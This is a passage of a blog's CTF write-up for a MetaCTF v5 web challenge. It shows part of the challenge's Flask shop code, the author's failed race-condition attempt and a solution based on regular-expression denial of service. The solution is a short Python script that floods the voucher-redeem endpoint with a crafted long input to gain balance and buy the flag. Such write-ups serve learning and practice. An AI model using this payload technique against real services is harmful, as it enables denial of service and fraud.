        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Product not found</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span>

    <span class="n">product_price</span> <span class="o">=</span> <span class="n">products</span><span class="p">[</span><span class="n">product_name</span><span class="p">]</span>

    <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db_connection</span><span class="p">()</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>

    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT balance FROM users WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">username</span><span class="p">,))</span>
    <span class="n">current_balance</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchone</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">current_balance</span> <span class="o">&lt;</span> <span class="n">product_price</span><span class="p">:</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Insufficient balance</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="n">new_balance</span> <span class="o">=</span> <span class="n">current_balance</span> <span class="o">-</span> <span class="n">product_price</span>

    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">UPDATE users SET balance = %s WHERE username = %s</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">new_balance</span><span class="p">,</span> <span class="n">username</span><span class="p">))</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>

    <span class="n">cursor</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">product_name</span> <span class="o">==</span> <span class="sh">"</span><span class="s">Flag</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
            <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Wow how do you have so much money here is your flag: </span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">FLAG</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>
        <span class="p">}),</span> <span class="mi">200</span>

    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span>
        <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Successfully purchased </span><span class="si">{</span><span class="n">product_name</span><span class="si">}</span><span class="s">. Remaining balance: </span><span class="si">{</span><span class="n">new_balance</span><span class="si">}</span><span class="s">, We will ship to you as fast as possible :)</span><span class="sh">"</span>
    <span class="p">}),</span> <span class="mi">200</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/css/&lt;path:filename&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">serve_css</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">assets</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">css</span><span class="sh">'</span><span class="p">),</span> <span class="n">filename</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/js/&lt;path:filename&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">serve_js</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">assets</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">js</span><span class="sh">'</span><span class="p">),</span> <span class="n">filename</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/images/&lt;path:filename&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">serve_images</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">send_from_directory</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">assets</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">images</span><span class="sh">'</span><span class="p">),</span> <span class="n">filename</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

</code></pre></div></div>

<p>Notice that the check of our voucher uses multithread which is weird and dangerous, I thought it would be a race condition because of the threading being used there but I was wrong after a lot of try-and-fail, using race condition we can only consume the same or any two vouchers only twice i.e we can get the balance of 200 only.</p>

<p>At this point I wasn’t aware of the hint and had no ideas to try it out, the CTF was over and I couldn’t solve the challenge. The next day after the CTF in the morning I rechecked the website and noticed that I had many notifications in the platform, the last one was that a new hint was added to chamb challenge, felt despair a bit and continued to the challenge to see the hint. Now it mentioned regex and we know about multithreading, the first thing that came to my mind was to check for ReDos in <a href="https://book.hacktricks.xyz/pentesting-web/regular-expression-denial-of-service-redos">Hacktricks</a> interestingly there was a clone and use tool for the job <a href="https://github.com/doyensec/regexploit">regexploit</a> after giving it the regex that was used in the website we got a ReDos possible input.</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-chamb-01.png" alt="metactfv5-chamb-01" /></p>

<p>Using this output I made the following exploit to get an infinite balance to buy the flag 👌+🏴= 🙂</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://f52668c3-8361-4727-8634-ad0a85fec4ac.cscpsut.com/</span><span class="sh">"</span>
<span class="n">buy_flag</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/buy_product?product=Flag</span><span class="sh">"</span>
<span class="n">redeem_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/redeem_voucher</span><span class="sh">"</span>


<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">]</span>
<span class="n">voucher</span> <span class="o">=</span> <span class="sh">"</span><span class="s">zoz-000-</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">3456</span> <span class="o">+</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
        <span class="n">redeem_url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">:</span> <span class="n">session</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">voucher</span><span class="sh">"</span><span class="p">:</span> <span class="n">voucher</span><span class="p">}</span>
    <span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Attempt </span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">()</span>
<span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">buy_flag</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">session</span><span class="sh">"</span><span class="p">:</span> <span class="n">session</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

</code></pre></div></div>

<p><img src="/assets/images/metactf-writeups/metactfv5-chamb-02.png" alt="metactfv5-chamb-02" /></p>

<p>Hope you enjoyed and learned a lot while reading this 🙂</p>



<ul class="taxonomy__index">
  
  
    <li>
      <a href="#2024">
        <strong>2024</strong> <span class="taxonomy__count">2</span>
      </a>
    </li>
  
</ul>




  <section id="2024" class="taxonomy__section">
    <h2 class="archive__subtitle">2024</h2>
    <div class="entries-list">
      
        



<div class="list__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/ncsc-training-2024" rel="permalink">NCSC Training 2024 Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          6 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Here are the write-ups for the challenges from the NCSC Training 2024 CTF, which took place from July 11th to July 13th, 2024.
</p>
  </article>
</div>

      
        



<div class="list__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/metactf-v5-2024" rel="permalink">MetaCTF v5 2024 Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Writeups for the MetaCTF v5 2024 CTF Web Challenges that was held on 30th June 2024.
</p>
  </article>
</div>

      
    </div>
    <a href="#page-title" class="back-to-top">Back to top &uarr;</a>
  </section>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-07-10T00:00:00+03:00">July 10, 2024</time></p>

      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=MetaCTF+v5+2024+Writeups%20https%3A%2F%2F0x0oz.github.io%2Fwriteups%2Fmetactf-v5-2024" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2F0x0oz.github.io%2Fwriteups%2Fmetactf-v5-2024" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://0x0oz.github.io/writeups/metactf-v5-2024" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="#" class="pagination--pager disabled">Previous</a>
    
    
      <a href="/writeups/ncsc-training-2024" class="pagination--pager" title="NCSC Training 2024 Writeups
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    
<div class="page__related">
  
  <h2 class="page__related-title">You may also enjoy</h2>
  <div class="grid__wrapper">
    
      
      



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/ncsc-training-writeups/ncsc-training-2024.jpg" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/writeups/ncsc-training-2024" rel="permalink">NCSC Training 2024 Writeups
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          6 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Here are the write-ups for the challenges from the NCSC Training 2024 CTF, which took place from July 11th to July 13th, 2024.
</p>
  </article>
</div>

    
  </div>
</div>

  
  
</div>

      
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
          <li><a href="https://github.com/0x0OZ" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
        
      
        
      
        
          <li><a href="https://instagram.com/0x0oz_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i> Instagram</a></li>
        
      
    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 <a href="https://0x0OZ.github.io">0xOZ</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>









  </body>
</html>
